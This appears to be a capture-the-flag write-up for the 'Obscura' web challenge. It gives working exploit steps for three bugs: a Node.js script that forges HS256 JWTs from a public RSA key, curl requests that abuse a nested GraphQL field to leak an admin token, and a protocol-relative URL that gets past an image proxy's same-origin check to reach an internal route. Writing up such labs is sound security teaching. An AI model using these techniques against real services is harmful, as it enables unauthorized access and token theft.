@@ -1,0 +1,414 @@
+---
+title: Obscura - [Netanix CTF](https://netanixctf.xyz/challenge/27)
+description: Full Obscura writeup covering JWT algorithm confusion, nested GraphQL authorization bypass, and protocol-relative URL behavior in an image proxy.
+author: admin12121
+date: 2026-05-29
+createdAt: 2026-05-29
+updatedAt: 2026-05-30
+---
+
+## Challenge
+
+<p align="center">
+    <img src="/images/writeups/obscura/challenge.webp" alt="Obscura challenge page on Netanix CTF" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+The challenge provided a deployed web application named **Obscura**. The description mentioned a public marketing site, a JWKS endpoint, a small GraphQL API, and an image proxy.
+
+Target:
+
+```txt title="Target"
+https://obscura-five-chi.vercel.app/
+```
+
+Goal:
+
+```txt title="Goal"
+Recover the flag from an environment variable on the production deployment.
+```
+
+---
+
+## Recon
+
+Important clarification: these routes were not all listed in the frontend source. They were found from a mix of challenge wording, standard web conventions, and confirmation by HTTP responses.
+
+| Route | How it was found | How it was confirmed |
+| --- | --- | --- |
+| `/.well-known/jwks.json` | The challenge mentioned a JWKS endpoint. `/.well-known/jwks.json` is the standard JWKS location. | Returned a valid JWKS JSON document. |
+| `/api/graphql` | The challenge mentioned a small GraphQL API. In Next.js apps, `/api/graphql` is a common route. | Accepted POST GraphQL requests and introspection worked. |
+| `/api/proxy` | The challenge mentioned an image proxy. I tested common names like `/api/proxy`. | Returned `{"error":"url required"}` without a `url` parameter, confirming the route. |
+| `/api/internal/secret` | This was inferred from the goal and route naming: flag was in an env var, and internal/secret-style routes are common in CTF web apps. | Returned `403 {"error":"forbidden"}` instead of `404`, and Vercel returned `x-matched-path: /api/internal/secret`. |
+
+So the route list is not "from the code"; it is "confirmed during recon". The challenge text gave the component names, then each route was validated by behavior.
+
+
+I first checked whether the internal route existed:
+
+```bash title="Check internal route"
+curl -i 'https://obscura-five-chi.vercel.app/api/internal/secret'
+```
+
+Response:
+
+```json title="Response"
+{"error":"forbidden"}
+```
+
+This confirmed that `/api/internal/secret` was real but protected.
+
+<p align="center">
+    <img src="/images/writeups/obscura/02-secret-forbidden.webp" alt="Direct request to internal secret route returns forbidden" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## GraphQL Introspection
+
+The GraphQL endpoint was available at:
+
+```txt title="GraphQL Endpoint"
+/api/graphql
+```
+
+I used introspection to list query fields:
+
+```bash title="List GraphQL query fields"
+curl -sS 'https://obscura-five-chi.vercel.app/api/graphql' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{ __schema { queryType { fields { name } } } }"}'
+```
+
+Important query fields:
+
+```graphql title="Query Fields"
+viewer
+latestUploads
+getComment(id: ID!)
+listComments(uploadId: ID!)
+internalAuditEntry(id: ID!)
+healthcheck
+```
+
+Then I inspected the available types:
+
+```bash title="Inspect GraphQL types"
+curl -sS 'https://obscura-five-chi.vercel.app/api/graphql' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{ __schema { types { name fields { name type { kind name ofType { kind name } } } } } }"}'
+```
+
+The interesting types were:
+
+```graphql title="Important GraphQL Types"
+type Comment {
+  id: ID!
+  body: String!
+  author: User
+  upload: Upload
+  auditEntry: AuditEntry
+}
+
+type AuditEntry {
+  id: ID!
+  action: String!
+  target: String!
+  notes: String
+  performedBy: User
+  apiToken: String
+}
+```
+
+The key field was:
+
+```graphql title="Sensitive Field"
+AuditEntry.apiToken
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/03-graphql-introspection.webp" alt="GraphQL introspection showing Query fields and AuditEntry type" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Step 1: JWT Algorithm Confusion
+
+The challenge exposed a public JWKS:
+
+```bash title="Save JWKS"
+curl -sS 'https://obscura-five-chi.vercel.app/.well-known/jwks.json' \
+  -o /tmp/obscura_jwks.json
+```
+
+View it:
+
+```bash title="View JWKS"
+cat /tmp/obscura_jwks.json
+```
+
+The key was an RSA key intended for `RS256`. The bug was that the backend also accepted `HS256`. That means the RSA public key could be converted to PEM and used as an HMAC secret.
+
+<p align="center">
+    <img src="/images/writeups/obscura/04-jwks.webp" alt="Public JWKS endpoint exposing RSA key" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+Create `forge-obscura-token.js`:
+
+```js title="forge-obscura-token.js"
+const fs = require("fs");
+const crypto = require("crypto");
+
+const jwks = JSON.parse(fs.readFileSync("/tmp/obscura_jwks.json", "utf8"));
+const jwk = jwks.keys[0];
+
+const pem = crypto
+  .createPublicKey({ key: jwk, format: "jwk" })
+  .export({ type: "spki", format: "pem" });
+
+function b64(obj) {
+  return Buffer.from(JSON.stringify(obj)).toString("base64url");
+}
+
+const now = Math.floor(Date.now() / 1000);
+
+const header = b64({
+  alg: "HS256",
+  typ: "JWT",
+  kid: "obscura-v1"
+});
+
+const payload = b64({
+  sub: "u_2",
+  role: "member",
+  iat: now,
+  exp: now + 3600
+});
+
+const signingInput = header + "." + payload;
+const sig = crypto
+  .createHmac("sha256", pem)
+  .update(signingInput)
+  .digest("base64url");
+
+console.log(signingInput + "." + sig);
+```
+
+Important note:
+
+Use the PEM generated by Node directly. Manually copying the PEM can break the signature if formatting or the final newline differs.
+
+[JWK to PEM](https://8gwifi.org/jwkconvertfunctions.jsp) 
+
+<p align="center">
+    <img src="/images/writeups/obscura/005-forged-jwt.webp" alt="Generated forged HS256 JWT using public RSA key as HMAC secret" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+[JWT.io](https://www.jwt.io/)
+
+<p align="center">
+    <img src="/images/writeups/obscura/05-forged-jwt.webp" alt="Generated forged HS256 JWT using public RSA key as HMAC secret" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Step 2: Verify the Forged JWT
+
+I verified the token with the `viewer` query:
+
+```bash title="Verify forged token"
+curl -sS 'https://obscura-five-chi.vercel.app/api/graphql' \
+  -H "Authorization: Bearer $JWT" \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{ viewer { id handle role } }"}'
+```
+
+Expected result:
+
+```json title="Viewer result"
+{
+  "data": {
+    "viewer": {
+      "id": "u_2",
+      "handle": "gallerist",
+      "role": "ADMIN"
+    }
+  }
+}
+```
+
+This confirmed that the forged JWT was accepted.
+
+<p align="center">
+    <img src="/images/writeups/obscura/06-viewer-admin.webp" alt="Forged JWT authenticates as gallerist admin user" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Step 3: Find the Nested GraphQL Authorization Bypass
+
+The top-level audit query was protected:
+
+```bash title="Top-level audit query"
+curl -sS 'https://obscura-five-chi.vercel.app/api/graphql' \
+  -H "Authorization: Bearer $JWT" \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{ internalAuditEntry(id:\"ae_1\") { id action target apiToken } }"}'
+```
+
+Response:
+
+```json title="Denied audit query"
+{
+  "errors": [
+    {
+      "message": "admin only"
+    }
+  ],
+  "data": {
+    "internalAuditEntry": null
+  }
+}
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/07-internal-audit-denied.webp" alt="Top-level internalAuditEntry query is denied" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+The bypass was through the nested `Comment.auditEntry` field. The direct resolver was protected, but the same object was exposed when reached through comments.
+
+Request:
+
+```bash title="Leak nested AuditEntry"
+curl -sS 'https://obscura-five-chi.vercel.app/api/graphql' \
+  -H "Authorization: Bearer $JWT" \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{ listComments(uploadId:\"up_1\") { id body auditEntry { id action target notes apiToken performedBy { id handle role } } } }"}'
+```
+
+Important result:
+
+```json title="Leaked audit entry"
+{
+  "id": "ae_1",
+  "action": "upload.delete",
+  "target": "up_99",
+  "notes": "stale, no traffic",
+  "apiToken": "ob-adm-tk_4f8a72b1e6c34d09a5e2916834cf0d1c",
+  "performedBy": {
+    "id": "u_2",
+    "handle": "gallerist",
+    "role": "ADMIN"
+  }
+}
+```
+
+Leaked admin API token:
+
+```txt title="Admin API Token"
+ob-adm-tk_4f8a72b1e6c34d09a5e2916834cf0d1c
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/08-audit-token-leak.webp" alt="Nested Comment.auditEntry leaks the admin API token" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Step 4: Analyze the Proxy
+
+The proxy endpoint was:
+
+```txt title="Proxy Endpoint"
+/api/proxy?url=<target>
+```
+
+A normal external fetch worked:
+
+```bash title="Proxy external request"
+curl -i 'https://obscura-five-chi.vercel.app/api/proxy?url=https%3A%2F%2Fhttpbin.org%2Fheaders'
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/09-proxy-external.webp" alt="Image proxy fetching an external URL" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+A normal same-origin URL was blocked:
+
+```bash title="Normal same-origin URL blocked"
+curl -i 'https://obscura-five-chi.vercel.app/api/proxy?url=https%3A%2F%2Fobscura-five-chi.vercel.app%2Fapi%2Finternal%2Fsecret'
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/10-proxy-same-origin-blocked.webp" alt="Proxy blocks normal same-origin URL" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+However, protocol-relative URLs were handled differently:
+
+```txt title="Protocol-relative URL"
+//obscura-five-chi.vercel.app/api/internal/secret
+```
+
+Encoded:
+
+```txt title="Encoded URL"
+%2F%2Fobscura-five-chi.vercel.app%2Fapi%2Finternal%2Fsecret
+```
+
+Request:
+
+```bash title="Protocol-relative proxy request"
+curl -i 'https://obscura-five-chi.vercel.app/api/proxy?url=%2F%2Fobscura-five-chi.vercel.app%2Fapi%2Finternal%2Fsecret'
+```
+
+Response:
+
+```json title="Response"
+{"error":"unauthorized"}
+```
+
+This response was important. The direct request returned `forbidden`, but the protocol-relative proxy request returned `unauthorized`. That showed the proxy reached the internal route through a different path.
+
+<p align="center">
+    <img src="/images/writeups/obscura/11-proxy-proto-relative-unauthorized.webp" alt="Protocol-relative URL reaches secret route through proxy and returns unauthorized" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Step 5: Retrieve the Flag
+
+The final step was to combine the leaked admin API token with the protocol-relative proxy request.
+
+Final request:
+
+```bash title="Final flag request"
+curl -sS \
+  -H 'Authorization: Bearer ob-adm-tk_4f8a72b1e6c34d09a5e2916834cf0d1c' \
+  'https://obscura-five-chi.vercel.app/api/proxy?url=%2F%2Fobscura-five-chi.vercel.app%2Fapi%2Finternal%2Fsecret'
+```
+
+Response:
+
+```json title="Flag response"
+{
+  "ok": true,
+  "flag": "NxCTF{rs256_to_hs256_+_nested_idor_+_axios_proto_relative}"
+}
+```
+
+<p align="center">
+    <img src="/images/writeups/obscura/12-flag.webp" alt="Final proxy request returns the Obscura flag" style={{maxWidth: '720px', width: '100%', height: 'auto', borderRadius: '8px'}} />
+</p>
+
+---
+
+## Why It Worked
+
+There were three separate bugs.
+
+First, the JWT verifier accepted `HS256` even though the published JWKS key was an RSA key intended for `RS256`. This made it possible to sign a valid token with the public key as an HMAC secret.
+
+Second, GraphQL authorization was inconsistent. The top-level `internalAuditEntry` query was protected, but the nested `Comment.auditEntry` field exposed the same sensitive object and included `apiToken`.
+
+Third, the proxy blocked standard same-origin URLs but did not correctly reject protocol-relative same-origin URLs. This allowed the internal route to be reached through `/api/proxy`.
+
+Together, these bugs exposed the internal secret endpoint and returned the environment variable containing the flag.
